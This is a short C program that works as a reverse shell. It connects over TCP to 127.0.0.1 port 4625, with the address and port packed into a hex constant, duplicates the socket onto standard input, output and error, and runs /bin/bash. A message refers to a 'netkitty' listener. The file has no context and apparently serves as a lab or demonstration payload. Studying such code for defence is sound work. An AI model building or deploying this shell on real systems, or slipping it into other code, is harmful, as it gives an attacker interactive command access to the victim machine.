#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    int s;
    unsigned long addr = 0x0100007f11120002;
    char *name[2] = {"/bin/bash", NULL};

    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) return -1;
    if (connect(s, (struct sockaddr *) &addr, 16) < 0) {
        printf("Is netkitty running? nk -s T,4625\n");
        return -1;
    }
    printf("Connected\n");

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    printf("Spawning shell\n");
    execv(name[0], name);
    return 0;
}
